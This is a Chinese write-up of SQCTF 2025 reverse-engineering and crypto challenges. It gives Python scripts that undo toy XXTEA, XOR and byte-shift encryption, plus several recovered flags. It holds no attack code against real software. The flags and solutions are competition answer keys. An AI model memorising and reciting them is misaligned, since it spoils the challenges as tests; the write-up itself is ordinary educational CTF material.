![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413151136667.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-093.png)

直接写exp或者Al

```plain
import xxtea  

encrypted_block = bytes.fromhex('4510A41C2810122E')  

key = bytes.fromhex('78563412EFCDAB9078563412EFCDAB90')  
  
decrypted_block = xxtea.decrypt(encrypted_block, key)  
  
flag = decrypted_block.decode('utf-8').rstrip('\x00')  
  
print("result:", flag)
```

给一个deepseek分析的脚本

```plain
import struct

def xxtea_decrypt(v, key):
    n = len(v)
    if n == 0:
        return []
    rounds = 6 + 52 // n
    sum_val = (0x9E3779B9 * rounds) & 0xFFFFFFFF
    y = v[0] & 0xFFFFFFFF
    for _ in range(rounds):
        e = (sum_val >> 2) & 3
        for p in range(n-1, 0, -1):
            z = v[p-1] & 0xFFFFFFFF
            term1 = ((z >> 5) ^ ((y << 2) & 0xFFFFFFFF)) & 0xFFFFFFFF
            term2 = ((y >> 3) ^ ((z << 4) & 0xFFFFFFFF)) & 0xFFFFFFFF
            sum_term = (term1 + term2) & 0xFFFFFFFF
            other_term = ((sum_val ^ y) + (key[(p & 3) ^ e] ^ z)) & 0xFFFFFFFF
            total = (sum_term ^ other_term) & 0xFFFFFFFF
            v[p] = (v[p] - total) & 0xFFFFFFFF
            y = v[p] & 0xFFFFFFFF
        z = v[-1] & 0xFFFFFFFF
        term1 = ((z >> 5) ^ ((y << 2) & 0xFFFFFFFF)) & 0xFFFFFFFF
        term2 = ((y >> 3) ^ ((z << 4) & 0xFFFFFFFF)) & 0xFFFFFFFF
        sum_term = (term1 + term2) & 0xFFFFFFFF
        other_term = ((sum_val ^ y) + (key[(0 & 3) ^ e] ^ z)) & 0xFFFFFFFF
        total = (sum_term ^ other_term) & 0xFFFFFFFF
        v[0] = (v[0] - total) & 0xFFFFFFFF
        y = v[0] & 0xFFFFFFFF
        sum_val = (sum_val - 0x9E3779B9) & 0xFFFFFFFF
    return v

key = [0x12345678, 0x9ABCDEF0, 0xFEDCBA98, 0x87654321]
ciphertext = [0x8F748963, 0xCB1D96A8]

# 解密
decrypted = xxtea_decrypt(ciphertext.copy(), key)

# 转换为小端字节序列
bytes_result = b''.join(struct.pack('<I', x) for x in decrypted)

# 去除尾部填充的零并解码为字符串
flag = bytes_result.rstrip(b'\x00').decode('utf-8')

print("flag{" + flag + "}")
```



### 慕然回首，那人却在灯火阑珊处
运行一下，发现wasd，猜测迷宫题，无壳，直接放ida里分析

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413153842870.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-094.png)

简单的迷宫题：第一步找出迷宫即可

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413153938344.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-095.png)

双击maze可以看到迷宫，提取出来然后转换为常见的迷宫形式

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413154350707.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-096.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413154337696.png)

```plain
            ![](/assets/docs/比赛wp/SQCTF2025WP/img-097.png)                    
```

flag就是这个路径

### 鹅鹅鹅，曲项向天歌
依旧pyc类型题目，先exe->pyc->py，然后分析源码

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413155224875.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-098.png)

反汇编得到源码

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413155406659.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-099.png)

分了三部分加密，逆向逻辑就是用密文反向将part_3每个字符ascll码+7,part_1每个字符ascll码-5即可得到原始flag

```plain
def decrypt_flag():  
    text = 'itd~tzw_know_sanmenxbZ8'  
    part1 = 'flag{'  
    part3 = '}'  
    part2_1 = text[:7]  
    part2_1 = ''.join([chr(ord(c) -5) for c in part2_1])  
    part2_2 = text[7:20]  
    part2_2 = part2_2    
    part2_3 = text[20:23]  
    part2_3 = ''.join([chr(ord(c) +7) for c in part2_3])  
    #拼接flag
    decrypted_part2 = part2_1 + part2_2 + part2_3  
    # 构造完整flag  
    true_flag = part1 + decrypted_part2 + part3  
    print("Decrypted flag:", true_flag)  
  
decrypt_flag()
```

### 唧唧复唧唧，木兰当户织
先查壳，然后放ida中

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413160857007.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-100.png)

base64解密，在线网站解就行

```plain
SQCTF{xixibuxixi,mulandanghuzhi}
```

### 圣人当仁不让
先工具查看基础信息，然后放入ida中分析

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413161543814.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-101.png)

对输入的flag进行判断，加密逻辑先将输入的值长度进行判断然后放入Dest中然后执行vm_execute函数，最后用base加密，解密过程就是将加密过程逆着来一遍即可解的flag

![](/assets/docs/比赛wp/SQCTF2025WP/img-102.png)![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413162109075.png)

vm_execute函数：

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413162441557.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-103.png)

exp：

```plain
import base64

# Base64解码数据
encrypted_b64 = "/P7sAe/U0s7c1vjb0vjfyt=="
encrypted_data = base64.b64decode(encrypted_b64)

def decrypt_data(data):
    decrypted = bytearray(data)
    for i in range(min(0x11, len(decrypted))):
        # 减3 → 异或0xAA
        decrypted[i] = ((decrypted[i] - 3) % 0x100) ^ 0xAA
    return bytes(decrypted)

result = decrypt_data(encrypted_data)

print("Decrypted Text:", result.decode('utf-8'))

```

### 往事暗沉不可追
看到这个依旧，先exe->pyc->py，然后分析源码

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413164317136.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-104.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413164458986.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413164522023.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-105.png)

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413164554067.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-106.png)

![](/assets/docs/比赛wp/SQCTF2025WP/img-107.png)

用py语法模拟了一个vm通过执行bytecode指令集将数据加密为下面的数据，分析发现是进行了两次异或（80，170），然后将数据存储在48的位置deepseek查资料得知. 

```plain
1.LOAD 0, 16：将内存地址16的值加载到寄存器0。
```

2. XOR 0, 85：将寄存器0的值与85异或。
3. STORE 0, 32：将寄存器0的值存储到内存地址32。
4. LOAD 1, 32：将内存地址32的值加载到寄存器1。
5. XOR 1, 170：将寄存器1的值与170异或。
6. STORE 1, 48：将寄存器1的值存储到内存地址48。

```plain
# 加密过程等效：
encrypted_byte = original_byte ^ 85 ^ 170
# 即：
encrypted_byte = original_byte ^ (85 ^ 170) = original_byte ^ 0xFF
```

exp:

```plain
encrypted_data = [127, 131, 125, 123, 135, 127, 133, 123, 125, 131, 127, 135, 131, 123, 135, 125]

# 逆向加密过程（两次异或等效于异或255）
decrypted = [byte ^ 0xFF for byte in encrypted_data]

print("解密后的数值:", decrypted)
```



### 看山不是山
![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413162804539.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-108.png)

扔进ida分析发现一堆py函数，猜测跟前面pyc题目做法一样，先试着根上面一样的做法，发现可以反汇编出源码。那么就可以正常分析

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413163145736.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-109.png)

反汇编得到源码：

![](C:\Users\xiler\AppData\Roaming\Typora\typora-user-images\image-20250413163512902.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-110.png)

为了解密数据，需要逆向操作：

1. **减法操作**：加密时进行了加法操作，解密时需要对每个字节减去 `i`。
2. **异或操作**：加密时进行了异或操作，解密时需要再次异或相同的值。

exp：

```plain
def decrypt(encrypted_data):
    result = []
    key = 439041101
    for i in range(len(encrypted_data)):
        byte = encrypted_data[i]
        # 先逆向加法操作
        byte = (byte - i) & 255
        # 再逆向异或操作
        byte = byte ^ (key >> ((i % 4) * 8)) & 255
        result.append(byte)
    return bytes(result)

# 给定的加密数据
encrypted_data = bytes.fromhex('738495a6b7c8d9e0f123456789abcdef')

# 解密数据
decrypted_data = decrypt(encrypted_data)

print("解密后的数据:", decrypted_data.hex())

```

# Crypto部分
### 简单RSA
![](/assets/docs/比赛wp/SQCTF2025WP/img-111.png)

 

 

### ezCRT
![](/assets/docs/比赛wp/SQCTF2025WP/img-112.png)

Latin-1解码结果 = SQCTF{CRT_Unl0cks_RSA_Eff1c13ncy}

### 失落矿洞中的密码
![](/assets/docs/比赛wp/SQCTF2025WP/img-113.png)![](/assets/docs/比赛wp/SQCTF2025WP/img-114.png)

### 1789年的密文
此为转轮密码

经过尝试正确答案是第十六列结果：maketysecgreat

![](/assets/docs/比赛wp/SQCTF2025WP/img-115.png)

### 丢三落四的小l
![](/assets/docs/比赛wp/SQCTF2025WP/img-116.png)

### ez_SCA
![](/assets/docs/比赛wp/SQCTF2025WP/img-117.png)

<font style="color:black;">模板轨迹</font><font style="color:black;">0</font><font style="color:black;">和模板轨迹</font><font style="color:black;">1</font><font style="color:black;">的形状都是</font><font style="color:black;">(1000,)</font><font style="color:black;">，说明每个模板都是单一的一维数组，长度为</font><font style="color:black;">1000</font><font style="color:black;">个时间点。而能量轨迹</font><font style="color:black;">traces</font><font style="color:black;">的形状是</font><font style="color:black;">(424, 1000)</font><font style="color:black;">，这说明有</font><font style="color:black;">424</font><font style="color:black;">条轨迹，每条轨迹也有</font><font style="color:black;">1000</font><font style="color:black;">个时间点。模板</font><font style="color:black;">0</font><font style="color:black;">和模板</font><font style="color:black;">1</font><font style="color:black;">的相关系数完全相同，都是约</font><font style="color:black;">0.996</font><font style="color:black;">，无法区分该位是</font><font style="color:black;">0</font><font style="color:black;">还是</font><font style="color:black;">1,</font><font style="color:black;">需要调整。</font>

![](/assets/docs/比赛wp/SQCTF2025WP/img-118.png)

<font style="color:black;">最大差异出现在时间点</font><font style="color:black;">8</font><font style="color:black;">。但是时间范围设置到</font><font style="color:black;">8</font><font style="color:black;">附近的结果不对。</font>

AI莫名其妙分析出了范围设定在600-700。但是AI给不出画出结果在600-700图的代码。  
![](/assets/docs/比赛wp/SQCTF2025WP/img-119.png)

### Common Modulus
![](/assets/docs/比赛wp/SQCTF2025WP/img-120.png)

这是不是base啊

![](/assets/docs/比赛wp/SQCTF2025WP/img-121.png)

### 玩的挺变态啊清茶哥
此为猪圈密码

![](/assets/docs/比赛wp/SQCTF2025WP/img-122.png)

### 密室逃脱的终极挑战
![](/assets/docs/比赛wp/SQCTF2025WP/img-123.png)

第一关为ROT10，第二关为栅栏密码分为2栏时，解密结果为:The?secret?message?is?hidden?in?the?flag，删除？。第三步为摩斯电码/为分隔符并字母改为大写。第四步为base64加密SQCTF{F4BBAC33-8D80-A886-5238-EA35B38B353A}



### 字母的轮舞与维吉尼亚的交响曲
爆破密码获得密钥

![](/assets/docs/比赛wp/SQCTF2025WP/img-124.png)

![](/assets/docs/比赛wp/SQCTF2025WP/img-125.png)

凯撒密码获得答案![](/assets/docs/比赛wp/SQCTF2025WP/img-126.png)

### 春风得意马蹄疾
经过4次核心主义价值观解密SQCTF{E2jacnicamcm_cnanamw_kwkma}

### 你的天赋是什么
莫斯密码SQCTF{YOU-HAVE-TALENT}

### 别阴阳我了行吗?
随波逐流阴阳怪气解码

![](/assets/docs/比赛wp/SQCTF2025WP/img-127.png)

